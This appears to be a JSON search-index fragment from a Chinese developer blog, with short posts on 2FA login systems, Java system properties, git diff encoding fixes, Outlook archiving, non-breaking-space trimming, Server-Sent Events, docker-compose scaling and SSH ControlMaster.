","date":"2022-02-13","objectID":"/blog/posts/%E7%99%BB%E5%85%A5%E9%96%8B%E6%BA%90%E7%B3%BB%E7%B5%B1-%E5%8C%85%E5%90%AB%E6%9C%892FA-%E6%95%B4%E7%90%86/:0:0","tags":["2fa","sso"],"title":"登入開源系統(包含有2FA)整理","uri":"/blog/posts/%E7%99%BB%E5%85%A5%E9%96%8B%E6%BA%90%E7%B3%BB%E7%B5%B1-%E5%8C%85%E5%90%AB%E6%9C%892FA-%E6%95%B4%E7%90%86/"},{"categories":["程式心法"],"content":"authentik Welcome | authentik 功能看起來很多，不過有爬文聽說Ram吃到700MB，因為要跑在樹莓派上面，所以就沒有使用這個，程式是用 Python。 ","date":"2022-02-13","objectID":"/blog/posts/%E7%99%BB%E5%85%A5%E9%96%8B%E6%BA%90%E7%B3%BB%E7%B5%B1-%E5%8C%85%E5%90%AB%E6%9C%892FA-%E6%95%B4%E7%90%86/:1:0","tags":["2fa","sso"],"title":"登入開源系統(包含有2FA)整理","uri":"/blog/posts/%E7%99%BB%E5%85%A5%E9%96%8B%E6%BA%90%E7%B3%BB%E7%B5%B1-%E5%8C%85%E5%90%AB%E6%9C%892FA-%E6%95%B4%E7%90%86/"},{"categories":["程式心法"],"content":"Keycloak 好像是老牌，是用Java開發的。 這邊下面有講到很多，下面內容就參照這篇文章Day06 - 【入門篇】Keycloak的替代品 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天。 ","date":"2022-02-13","objectID":"/blog/posts/%E7%99%BB%E5%85%A5%E9%96%8B%E6%BA%90%E7%B3%BB%E7%B5%B1-%E5%8C%85%E5%90%AB%E6%9C%892FA-%E6%95%B4%E7%90%86/:2:0","tags":["2fa","sso"],"title":"登入開源系統(包含有2FA)整理","uri":"/blog/posts/%E7%99%BB%E5%85%A5%E9%96%8B%E6%BA%90%E7%B3%BB%E7%B5%B1-%E5%8C%85%E5%90%AB%E6%9C%892FA-%E6%95%B4%E7%90%86/"},{"categories":["程式心法"],"content":"authelia 目前使用這個在樹莓派上面，聽說使用量也不高，目前跑得還穩穩地。 ","date":"2022-02-13","objectID":"/blog/posts/%E7%99%BB%E5%85%A5%E9%96%8B%E6%BA%90%E7%B3%BB%E7%B5%B1-%E5%8C%85%E5%90%AB%E6%9C%892FA-%E6%95%B4%E7%90%86/:3:0","tags":["2fa","sso"],"title":"登入開源系統(包含有2FA)整理","uri":"/blog/posts/%E7%99%BB%E5%85%A5%E9%96%8B%E6%BA%90%E7%B3%BB%E7%B5%B1-%E5%8C%85%E5%90%AB%E6%9C%892FA-%E6%95%B4%E7%90%86/"},{"categories":["程式心法"],"content":"其他登入沒 ","date":"2022-02-13","objectID":"/blog/posts/%E7%99%BB%E5%85%A5%E9%96%8B%E6%BA%90%E7%B3%BB%E7%B5%B1-%E5%8C%85%E5%90%AB%E6%9C%892FA-%E6%95%B4%E7%90%86/:4:0","tags":["2fa","sso"],"title":"登入開源系統(包含有2FA)整理","uri":"/blog/posts/%E7%99%BB%E5%85%A5%E9%96%8B%E6%BA%90%E7%B3%BB%E7%B5%B1-%E5%8C%85%E5%90%AB%E6%9C%892FA-%E6%95%B4%E7%90%86/"},{"categories":["程式心法"],"content":"Casbin、Casdoor 看到 Github Issue 有寫沒支援 2FA 功能。 Casbin · An authorization library that supports access control models like ACL, RBAC, ABAC for Golang, Java, C/C++, Node.js, Javascript, PHP, Laravel, Python, .NET (C#), Delphi, Rust, Ruby, Swift (Objective-C), Lua (OpenResty), Dart (Flutter) and Elixir 那篇還滿多的，就簡單成列出來，有機會用到再回來補。 okta CURITY IdentityServer CAS LemonLDAP OpenAM ","date":"2022-02-13","objectID":"/blog/posts/%E7%99%BB%E5%85%A5%E9%96%8B%E6%BA%90%E7%B3%BB%E7%B5%B1-%E5%8C%85%E5%90%AB%E6%9C%892FA-%E6%95%B4%E7%90%86/:4:1","tags":["2fa","sso"],"title":"登入開源系統(包含有2FA)整理","uri":"/blog/posts/%E7%99%BB%E5%85%A5%E9%96%8B%E6%BA%90%E7%B3%BB%E7%B5%B1-%E5%8C%85%E5%90%AB%E6%9C%892FA-%E6%95%B4%E7%90%86/"},{"categories":["程式心法"],"content":"常常沒寫，有時會忘記，特別紀錄一下。Java,PHP處理動作不一樣。 ","date":"2022-02-13","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F-continue-break-%E8%99%95%E7%90%86%E5%B7%A2%E7%8B%80%E8%BF%B4%E5%9C%88%E8%B7%B3%E5%87%BA%E6%95%B4%E7%90%86/:0:0","tags":["continue","break","java","php"],"title":"程式 continue/break 處理巢狀迴圈跳出整理","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F-continue-break-%E8%99%95%E7%90%86%E5%B7%A2%E7%8B%80%E8%BF%B4%E5%9C%88%E8%B7%B3%E5%87%BA%E6%95%B4%E7%90%86/"},{"categories":["程式心法"],"content":"Java/JavaScript continue/break label 是使用label 去控制的。 ","date":"2022-02-13","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F-continue-break-%E8%99%95%E7%90%86%E5%B7%A2%E7%8B%80%E8%BF%B4%E5%9C%88%E8%B7%B3%E5%87%BA%E6%95%B4%E7%90%86/:1:0","tags":["continue","break","java","php"],"title":"程式 continue/break 處理巢狀迴圈跳出整理","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F-continue-break-%E8%99%95%E7%90%86%E5%B7%A2%E7%8B%80%E8%BF%B4%E5%9C%88%E8%B7%B3%E5%87%BA%E6%95%B4%E7%90%86/"},{"categories":["程式心法"],"content":"PHP continue/break int 是使用數字去控制的。 ","date":"2022-02-13","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F-continue-break-%E8%99%95%E7%90%86%E5%B7%A2%E7%8B%80%E8%BF%B4%E5%9C%88%E8%B7%B3%E5%87%BA%E6%95%B4%E7%90%86/:2:0","tags":["continue","break","java","php"],"title":"程式 continue/break 處理巢狀迴圈跳出整理","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F-continue-break-%E8%99%95%E7%90%86%E5%B7%A2%E7%8B%80%E8%BF%B4%E5%9C%88%E8%B7%B3%E5%87%BA%E6%95%B4%E7%90%86/"},{"categories":["Java"],"content":"常常看到java -Dxxx=\"test\" com.xxx.Class 程式，不太了解-D帶入程式運作，今天特別整理一下，順便筆記。 ","date":"2022-02-13","objectID":"/blog/posts/Java-System-Properties/:0:0","tags":["java","properties"],"title":"Java System Properties","uri":"/blog/posts/Java-System-Properties/"},{"categories":["Java"],"content":"抓取 Java 系統參數(非環境變數) java.version Java 執行期環境版本 java.vendor Java 執行期環境供應商 java.vendor.url Java 供應商的 URL java.home Java 安裝目錄 java.vm.specification.version Java 虛擬機規範版本 java.vm.specification.vendor Java 虛擬機規範供應商 java.vm.specification.name Java 虛擬機規範名稱 java.vm.version Java 虛擬機實現版本 java.vm.vendor Java 虛擬機實現供應商 java.vm.name Java 虛擬機實現名稱 java.specification.version Java 執行期環境規範版本 java.specification.vendor Java 執行期環境規範供應商 java.specification.name Java 執行期環境規範名稱 java.class.version Java 類別格式版本號 java.class.path Java 類別路徑 java.library.path 加載庫時搜索的路徑串列（linked-list） java.io.tmpdir 預設的暫時檔路徑 java.compiler 要使用的 JIT 編譯器的名稱 java.ext.dirs 一個或多個擴展目錄的路徑 os.name 作業系統 的名稱 os.arch 作業系統 的架構 os.version 作業系統 的版本 file.separator 檔分隔設定（在 UNIX 系統中是“/”） path.separator 路徑分隔設定（在 UNIX 系統中是“:”） line.separator 行分隔設定（在 UNIX 系統中是“/n”） user.name 用戶的賬戶名稱 user.home 用戶的主目錄 user.dir 用戶的當前工作目錄 但還是可以自訂。 要怎麼看程式有哪些 System Properties，可以參考Java System Properties - HowToDoInJava。 import java.util.Properties; public class PrintSystemProperties { public static void main(String[] a) { // List all System properties Properties pros = System.getProperties(); pros.list(System.out); } } java -DPATH PrintSystemProperties java -DPATH=\"123Test\" PrintSystemProperties ","date":"2022-02-13","objectID":"/blog/posts/Java-System-Properties/:1:0","tags":["java","properties"],"title":"Java System Properties","uri":"/blog/posts/Java-System-Properties/"},{"categories":["Java"],"content":"抓取環境變數 String sysEnvStr = System.getenv(\"JAVA_HOME\"); 參考: java - How to I obtain the value of the environment variables? - Stack Overflow ","date":"2022-02-13","objectID":"/blog/posts/Java-System-Properties/:2:0","tags":["java","properties"],"title":"Java System Properties","uri":"/blog/posts/Java-System-Properties/"},{"categories":["Java"],"content":"其他相關: System (Java Platform SE 7 ) System.getProperty的參數用法 @ 符碼記憶 ","date":"2022-02-13","objectID":"/blog/posts/Java-System-Properties/:3:0","tags":["java","properties"],"title":"Java System Properties","uri":"/blog/posts/Java-System-Properties/"},{"categories":["Java"],"content":"Java 使用 Docker run 選擇方法 一般方式 參考: java - How to pass System property to docker containers? - Stack Overflow JAVA_OPTIONS 環境變數設定(推薦) JAVA_OPTIONS: \"-Xmx2g -Dcom.realobjects.pdfreactor.webservice.threadPoolSize=4\" 參考: Docker conatiner: Get passed environment varaible in tomcat spring mvc application - Server Fault 一般run 指定程式執行路徑，順便放system properties ","date":"2022-02-13","objectID":"/blog/posts/Java-System-Properties/:4:0","tags":["java","properties"],"title":"Java System Properties","uri":"/blog/posts/Java-System-Properties/"},{"categories":["Git"],"content":"GitKaran 查看都是亂碼，後來找到解決方法。但VSCODE看程式碼納編會有亂碼問題。 ","date":"2022-02-13","objectID":"/blog/posts/Git-diff-big5-%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:0:0","tags":["git","亂碼"],"title":"Git diff  big5 亂碼解決方法","uri":"/blog/posts/Git-diff-big5-%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"操作步驟 使用前怕Git改壞掉，建議可以先做zip備份。 CHG: git fork diff 比較 的時候中文亂碼 備份圖 Git：Diff不处理除UTF-8以外的字符编码？ 中国服务器网 gitattributes - How to create a Git attributes file - Stack Overflow Git 屬性 - - Pro Git 繁體中文版 catdoc 感覺很有趣，有空研究。 .gitattributes 作用详细讲解（git大佬必会技能)_StarJava_的博客-CSDN博客_gitattributes ","date":"2022-02-13","objectID":"/blog/posts/Git-diff-big5-%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:1:0","tags":["git","亂碼"],"title":"Git diff  big5 亂碼解決方法","uri":"/blog/posts/Git-diff-big5-%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"Step 1 gitconfig # fork的git %USERPROFILE%\\AppData\\Local\\Fork\\gitInstance\\環境最新版\\etc 但我不想做全域，所以把在專案下.git做設定。 gitconfig [diff \"cp950\"] textconv=iconv -f cp950 -t utf-8 ","date":"2022-02-13","objectID":"/blog/posts/Git-diff-big5-%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:1:1","tags":["git","亂碼"],"title":"Git diff  big5 亂碼解決方法","uri":"/blog/posts/Git-diff-big5-%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"Step2 .gitattributes .gitattributes 作用详细讲解（git大佬必会技能)_StarJava_的博客-CSDN博客_gitattributes .gitattributes生效順序 在一個Git庫中可以有多個.gitattributes 文件，不同.gitattributes 文件中，屬性設置的優先級(從高到低)如下： /myproj/info/attributes 文件 /myproj/my_path/.gitattributes 文件 /myproj/.gitattributes 文件 同一個.gitattributes 文件中，遵循覆蓋原則，即後面的行會覆蓋前面的設置，如果一個文件的某個屬性被多次設置，則後設置的優先，類似 int a = 1; a = 2; 最終結果a == 2。 ———————————————— 版权声明：本文为CSDN博主「StarJava_」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/qq_35425070/article/details/106883833 這樣我們設定在 Project目錄底下設定.gitattributes，如下: # 中文 *.java diff=cp950 *.sql diff=cp950 *.xml diff=cp950 *.html diff=cp950 *.xsl diff=cp950 *.css diff=cp950 *.cpp diff=cp950 *.hpp diff=cp950 *.c diff=cp950 *.h diff=cp950 ","date":"2022-02-13","objectID":"/blog/posts/Git-diff-big5-%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:1:2","tags":["git","亂碼"],"title":"Git diff  big5 亂碼解決方法","uri":"/blog/posts/Git-diff-big5-%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"Git add -p 行數會有問題(未解) Git add -p 行數會有問題 ","date":"2022-02-13","objectID":"/blog/posts/Git-diff-big5-%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:1:3","tags":["git","亂碼"],"title":"Git diff  big5 亂碼解決方法","uri":"/blog/posts/Git-diff-big5-%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"其他(彩蛋) windows下git中文乱码解决方式【图文】_wx60bf0f6c32435_51CTO博客 Git Diff中文乱码问题 (windows git bash)_qhexin的专栏-CSDN博客 ","date":"2022-02-13","objectID":"/blog/posts/Git-diff-big5-%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:2:0","tags":["git","亂碼"],"title":"Git diff  big5 亂碼解決方法","uri":"/blog/posts/Git-diff-big5-%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Outlook"],"content":"Outlook 信箱做封存方法(writed) 最近公司筆電空間快爆炸了，有買一個 SSD 硬碟。但這個是外接式硬碟，想找可以手動作封存方法，特別紀錄一下操作流程。 ","date":"2022-02-13","objectID":"/blog/posts/Outlook-%E4%BF%A1%E7%AE%B1%E5%81%9A%E5%B0%81%E5%AD%98%E6%96%B9%E6%B3%95/:0:0","tags":["outlook","封存"],"title":"Outlook 信箱做封存方法","uri":"/blog/posts/Outlook-%E4%BF%A1%E7%AE%B1%E5%81%9A%E5%B0%81%E5%AD%98%E6%96%B9%E6%B3%95/"},{"categories":["Outlook"],"content":"手動封存 參考: 手動存檔專案 自動封存功能的描述 - Outlook | Microsoft Docs 執行下列其中一項操作： 在[Outlook 2013：按一下 [檔案\u003e[\u003e清理工具\u003e檔案。 在 Outlook 2016 中：按一下 [檔案] \u003e [資訊] \u003e [工具] \u003e [清理舊項目] 按一下 [封存此資料夾及所有的子資料夾] 選項，然後選擇您要封存的資料夾。 在 [封存郵件早於] 下，輸入日期。 封存右下角處理動作，如圖。 ","date":"2022-02-13","objectID":"/blog/posts/Outlook-%E4%BF%A1%E7%AE%B1%E5%81%9A%E5%B0%81%E5%AD%98%E6%96%B9%E6%B3%95/:1:0","tags":["outlook","封存"],"title":"Outlook 信箱做封存方法","uri":"/blog/posts/Outlook-%E4%BF%A1%E7%AE%B1%E5%81%9A%E5%B0%81%E5%AD%98%E6%96%B9%E6%B3%95/"},{"categories":["Outlook"],"content":"外接硬碟封存卸除遇到狀況 選擇外接硬碟，假如拔除硬碟，開啟Outlook會跳出下圖，可按確定跳過。 再按下取消就可以跳過。 當然也可以拔掉pst設定，但這樣做封存又要新增，所以我就沒拔除了。 ","date":"2022-02-13","objectID":"/blog/posts/Outlook-%E4%BF%A1%E7%AE%B1%E5%81%9A%E5%B0%81%E5%AD%98%E6%96%B9%E6%B3%95/:1:1","tags":["outlook","封存"],"title":"Outlook 信箱做封存方法","uri":"/blog/posts/Outlook-%E4%BF%A1%E7%AE%B1%E5%81%9A%E5%B0%81%E5%AD%98%E6%96%B9%E6%B3%95/"},{"categories":["Outlook"],"content":"做完釋放 Outlook 空間 完成封存發現空間還是沒有改變，後來查看一下文章，發現要做壓縮才能釋放空間。 做完封存或刪除郵件後, 記得要做壓縮. 封存或刪除的資料空間才會真正的被移除, 檔案才會變小. https://support.microsoft.com/zh-tw/kb/2241478 參考:怎麼減少outlook個人資料夾pst檔大小 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2022-02-13","objectID":"/blog/posts/Outlook-%E4%BF%A1%E7%AE%B1%E5%81%9A%E5%B0%81%E5%AD%98%E6%96%B9%E6%B3%95/:2:0","tags":["outlook","封存"],"title":"Outlook 信箱做封存方法","uri":"/blog/posts/Outlook-%E4%BF%A1%E7%AE%B1%E5%81%9A%E5%B0%81%E5%AD%98%E6%96%B9%E6%B3%95/"},{"categories":["Outlook"],"content":"自動封存處理方法 可以在「收件夾」內容設定啟用自動封存或停用。子收件夾也可以做設定 收件夾內容設定自動封存選項 可參考:自動封存Outlook 郵件，不怕信箱容量爆掉 | T客邦 ","date":"2022-02-13","objectID":"/blog/posts/Outlook-%E4%BF%A1%E7%AE%B1%E5%81%9A%E5%B0%81%E5%AD%98%E6%96%B9%E6%B3%95/:3:0","tags":["outlook","封存"],"title":"Outlook 信箱做封存方法","uri":"/blog/posts/Outlook-%E4%BF%A1%E7%AE%B1%E5%81%9A%E5%B0%81%E5%AD%98%E6%96%B9%E6%B3%95/"},{"categories":["程式心法"],"content":"最近系統上傳Excel匯入功能發生問題，查詢發現資料庫匯入時候，數值莫名其妙會帶入空白，查詢發現是U+00A0問題，最後紀錄一下排除 方法。 參考: Unicode 查询 查找奇怪字元 不換行空格 - 維基百科，自由的百科全書 POI导入Excel，字符串格式出现空格，trim无效？_乐闻世界-CSDN博客_poi 空格 java - Apache POI Anomalous Whitespace (Resolved: \\u00A0 non-breaking space) - Stack Overflow “space” Unicode Characters \u0026 Entities Search | Amp What ","date":"2022-02-13","objectID":"/blog/posts/Excel-%E9%81%87%E5%88%B0%E5%A5%87%E6%80%AA%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-U-00A0/:0:0","tags":["excel","奇怪空白"],"title":"Excel 遇到奇怪空白字元(U+00A0)","uri":"/blog/posts/Excel-%E9%81%87%E5%88%B0%E5%A5%87%E6%80%AA%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-U-00A0/"},{"categories":["程式心法"],"content":"程式解決方法 ","date":"2022-02-13","objectID":"/blog/posts/Excel-%E9%81%87%E5%88%B0%E5%A5%87%E6%80%AA%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-U-00A0/:1:0","tags":["excel","奇怪空白"],"title":"Excel 遇到奇怪空白字元(U+00A0)","uri":"/blog/posts/Excel-%E9%81%87%E5%88%B0%E5%A5%87%E6%80%AA%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-U-00A0/"},{"categories":["程式心法"],"content":"方法1 /** * 去空格 * @param str * @return */ private String StringTrim(String str){ return str.replaceAll(\"[\\\\s\\\\u00A0]+\",\"\").trim(); } 參考:POI导入Excel，字符串格式出现空格，trim无效？_乐闻世界-CSDN博客_poi 空格 ","date":"2022-02-13","objectID":"/blog/posts/Excel-%E9%81%87%E5%88%B0%E5%A5%87%E6%80%AA%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-U-00A0/:1:1","tags":["excel","奇怪空白"],"title":"Excel 遇到奇怪空白字元(U+00A0)","uri":"/blog/posts/Excel-%E9%81%87%E5%88%B0%E5%A5%87%E6%80%AA%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-U-00A0/"},{"categories":["程式心法"],"content":"方法2(推薦) 全形空白也能過濾。 string.replaceAll(\"(^\\\\h*)|(\\\\h*$)\",\"\") string - How to trim no-break space in Java? - Stack Overflow ","date":"2022-02-13","objectID":"/blog/posts/Excel-%E9%81%87%E5%88%B0%E5%A5%87%E6%80%AA%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-U-00A0/:1:2","tags":["excel","奇怪空白"],"title":"Excel 遇到奇怪空白字元(U+00A0)","uri":"/blog/posts/Excel-%E9%81%87%E5%88%B0%E5%A5%87%E6%80%AA%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-U-00A0/"},{"categories":["程式心法"],"content":"造成原因 \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;test\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;test 顯上網頁內文貼到Excel會有問題。 ","date":"2022-02-13","objectID":"/blog/posts/Excel-%E9%81%87%E5%88%B0%E5%A5%87%E6%80%AA%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-U-00A0/:2:0","tags":["excel","奇怪空白"],"title":"Excel 遇到奇怪空白字元(U+00A0)","uri":"/blog/posts/Excel-%E9%81%87%E5%88%B0%E5%A5%87%E6%80%AA%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-U-00A0/"},{"categories":["程式心法"],"content":"使用者排除方法 複製到txt再複製到Excel。 貼到Excel 記得使用存文字貼上。 以上方法可排除 ","date":"2022-02-13","objectID":"/blog/posts/Excel-%E9%81%87%E5%88%B0%E5%A5%87%E6%80%AA%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-U-00A0/:2:1","tags":["excel","奇怪空白"],"title":"Excel 遇到奇怪空白字元(U+00A0)","uri":"/blog/posts/Excel-%E9%81%87%E5%88%B0%E5%A5%87%E6%80%AA%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-U-00A0/"},{"categories":["程式心法"],"content":"快速查詢方法 regex101: build, test, and debug regex [^\\d\\.\\s] 何時會再踩到這個雷，不知道XD。 ","date":"2022-02-13","objectID":"/blog/posts/Excel-%E9%81%87%E5%88%B0%E5%A5%87%E6%80%AA%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-U-00A0/:3:0","tags":["excel","奇怪空白"],"title":"Excel 遇到奇怪空白字元(U+00A0)","uri":"/blog/posts/Excel-%E9%81%87%E5%88%B0%E5%A5%87%E6%80%AA%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-U-00A0/"},{"categories":["JavaScript"],"content":"以前看這個沒有仔細看，以為就是瘋狂 AJAX 動作，很多網站沒教後端怎麼處理，最近看 API 書籍，裡面有講到 HTTP Streaming 東西(Server-Sent Events)，突然意識到這個機制是不一樣，但這個機制沒有普及，也有不少缺點，如Proxy代理緩存問題，所以很少看到網站使用這個。這邊就簡單紀錄。 ","date":"2022-02-13","objectID":"/blog/posts/HTML5-Server-Sent-Events-Eventsource-%E4%B8%80%E7%A8%AE%E5%82%B3%E8%BC%B8API%E6%96%B9%E5%BC%8F/:0:0","tags":["javascript","eventsource","html5"],"title":"HTML5 Server-Sent Events(Eventsource) 一種傳輸API方式","uri":"/blog/posts/HTML5-Server-Sent-Events-Eventsource-%E4%B8%80%E7%A8%AE%E5%82%B3%E8%BC%B8API%E6%96%B9%E5%BC%8F/"},{"categories":["JavaScript"],"content":"流程 簡單來說就是連接那個檔案，網路會讓瀏覽器一直接收內容，不會關閉連線。所以假如Server沒做連線關閉，使用者直接下載檔案可以做下載動作。 sequenceDiagram Client-\u003e\u003eServer: Open event streaming Server-\u003e\u003eClient: event Client-\u003e\u003eClient: onmessage Server-\u003e\u003eClient: event Client-\u003e\u003eClient: onmessage Server-\u003e\u003eClient: event Client-\u003e\u003eClient: onmessage 其他實作可參考: HTML5 Server-Sent Events(伺服器發送事件) 教學範例 for PHP - MIS 腳印 Server-Sent Events 教程 - 阮一峰的网络日志 Spring Boot使用Server-Sent Events - 知乎 Server-Sent Events入门 - strongmore - 博客园 非同步 Server-Sent Event ","date":"2022-02-13","objectID":"/blog/posts/HTML5-Server-Sent-Events-Eventsource-%E4%B8%80%E7%A8%AE%E5%82%B3%E8%BC%B8API%E6%96%B9%E5%BC%8F/:1:0","tags":["javascript","eventsource","html5"],"title":"HTML5 Server-Sent Events(Eventsource) 一種傳輸API方式","uri":"/blog/posts/HTML5-Server-Sent-Events-Eventsource-%E4%B8%80%E7%A8%AE%E5%82%B3%E8%BC%B8API%E6%96%B9%E5%BC%8F/"},{"categories":["Docker"],"content":"使用方法 舊版可以用docker-compose scale ...不過新版改成 docker-compose up --scale web=2，剛好最近學。順便紀錄一下問題。 ","date":"2022-02-13","objectID":"/blog/posts/Docker-compose-%E5%81%9A-scale-%E7%AD%86%E8%A8%98/:1:0","tags":["docker","scale"],"title":"Docker compose 做 scale 筆記","uri":"/blog/posts/Docker-compose-%E5%81%9A-scale-%E7%AD%86%E8%A8%98/"},{"categories":["Docker"],"content":"範例 這邊簡單建立 websocket 測試，nodejs是參考網路上JavaScript | WebSocket 讓前後端沒有距離. WebSocket 是網路協定的一種， Client 可以透過此協定與… | by 神Q超人 | Enjoy life enjoy coding | Medium範例。 main.js //import express 和 ws 套件 const express = require('express') const SocketServer = require('ws').Server //指定開啟的 port const PORT = 3000 //創建 express 的物件，並綁定及監聽 3000 port ，且設定開啟後在 console 中提示 const server = express() .listen(PORT, () =\u003e console.log(`Listening on ${PORT}`)) //將 express 交給 SocketServer 開啟 WebSocket 的服務 const wss = new SocketServer({ server }) //當 WebSocket 從外部連結時執行 wss.on('connection', ws =\u003e { console.log('Client connected') //對 message 設定監聽，接收從 Client 發送的訊息 ws.on('message', data =\u003e { //data 為 Client 發送的訊息，現在將訊息原封不動發送出去 ws.send(`${process.env.HOSTNAME}: response` + data) }) ws.on('close', () =\u003e { console.log('Close connected') }) }) dockerfile FROM node COPY main.js package.json . EXPOSE 3000 RUN npm install ENTRYPOINT npm start docker-compose.yml version: '3' services: node-app: image: 'nodejswebsocket' ports: - 3000 nginx: image: nginx:stable-alpine ports: - 8000:80 depends_on: - app volumes: - ./nginx.conf:/etc/nginx/conf.d/default.conf:ro # - ./var/log/nginx:/var/log/nginx nginx.conf map $http_upgrade $connection_upgrade { default Upgrade; '' close; } upstream websocket { server 192.168.0.10:9999; } server { listen 80 default_server; location / { proxy_pass http://node-app:3000; proxy_http_version 1.1; #WebSocket proxy_set_header Upgrade $http_upgrade; #WebSocket proxy_set_header Connection $connection_upgrade; #WebSocket } } 預設 port 會隨機分配。 Websocket 設定 SLB 反向代理設定可以參考 从websocket服务的nginx配置说起 小程序WebSocket通过F5无法转发问题解决 備份圖 ","date":"2022-02-13","objectID":"/blog/posts/Docker-compose-%E5%81%9A-scale-%E7%AD%86%E8%A8%98/:2:0","tags":["docker","scale"],"title":"Docker compose 做 scale 筆記","uri":"/blog/posts/Docker-compose-%E5%81%9A-scale-%E7%AD%86%E8%A8%98/"},{"categories":["Docker"],"content":"遇到錯誤問題 ","date":"2022-02-13","objectID":"/blog/posts/Docker-compose-%E5%81%9A-scale-%E7%AD%86%E8%A8%98/:3:0","tags":["docker","scale"],"title":"Docker compose 做 scale 筆記","uri":"/blog/posts/Docker-compose-%E5%81%9A-scale-%E7%AD%86%E8%A8%98/"},{"categories":["Docker"],"content":"docker-compose port 雷 這邊不能使用3000:3000，因為開多個container會撞到port version: '3' services: node-app: image: 'nodejswebsocket' ports: - 3000:3000 ","date":"2022-02-13","objectID":"/blog/posts/Docker-compose-%E5%81%9A-scale-%E7%AD%86%E8%A8%98/:3:1","tags":["docker","scale"],"title":"Docker compose 做 scale 筆記","uri":"/blog/posts/Docker-compose-%E5%81%9A-scale-%E7%AD%86%E8%A8%98/"},{"categories":["Docker"],"content":"需要架一個 SLB 分流 雖然內部node-app是會自動做分流，但對外連線沒辦法使用node-app來訪問，所以需要架設nginx 做反向代理，當然也能使用traefik 做。 ","date":"2022-02-13","objectID":"/blog/posts/Docker-compose-%E5%81%9A-scale-%E7%AD%86%E8%A8%98/:3:2","tags":["docker","scale"],"title":"Docker compose 做 scale 筆記","uri":"/blog/posts/Docker-compose-%E5%81%9A-scale-%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"有時候我們連一台主機。不可能只開一個 ssh 連線。每次連線都要重新輸入帳號密碼，真的也很花時間。無形之中又多做一次驗證，最近看到這個方法，簡單研究一下，希望能幫我開發上縮短幾次幾秒鐘XD。 ","date":"2022-02-13","objectID":"/blog/posts/ssh-%E4%BD%BF%E7%94%A8-ControlMaster-%E5%81%9A%E7%AC%AC%E4%BA%8C%E9%80%A3%E7%B7%9A%E8%87%AA%E5%8B%95%E7%99%BB%E5%85%A5-xshell-putty/:0:0","tags":["ssh","sshconfig"],"title":"ssh 使用 ControlMaster 做第二連線自動登入(xshell,putty)","uri":"/blog/posts/ssh-%E4%BD%BF%E7%94%A8-ControlMaster-%E5%81%9A%E7%AC%AC%E4%BA%8C%E9%80%A3%E7%B7%9A%E8%87%AA%E5%8B%95%E7%99%BB%E5%85%A5-xshell-putty/"},{"categories":["Linux"],"content":"ssh(ControlMaster) ControlMaster auto ControlPath /tmp/ssh-%r@%h:%p ssh -vvv master 可以看到 log 沒有做金鑰驗證。 使用密碼方式也能用這個方法喔!!! 參考:增進 SSH 使用效率 - ssh_config · 完全用 GNU/Linux 工作 更多設定可以看SSH Config 那些你所知道和不知道的事 - 台部落。 ","date":"2022-02-13","objectID":"/blog/posts/ssh-%E4%BD%BF%E7%94%A8-ControlMaster-%E5%81%9A%E7%AC%AC%E4%BA%8C%E9%80%A3%E7%B7%9A%E8%87%AA%E5%8B%95%E7%99%BB%E5%85%A5-xshell-putty/:1:0","tags":["ssh","sshconfig"],"title":"ssh 使用 ControlMaster 做第二連線自動登入(xshell,putty)","uri":"/blog/posts/ssh-%E4%BD%BF%E7%94%A8-ControlMaster-%E5%81%9A%E7%AC%AC%E4%BA%8C%E9%80%A3%E7%B7%9A%E8%87%AA%E5%8B%95%E7%99%BB%E5%85%A5-xshell-putty/"},{"categories":["Linux"],"content":"putty 登入前設定下面選項 (Putty Configuration -\u003e Connection-\u003e SSH -\u003e Share SSH connections if possible 打勾) 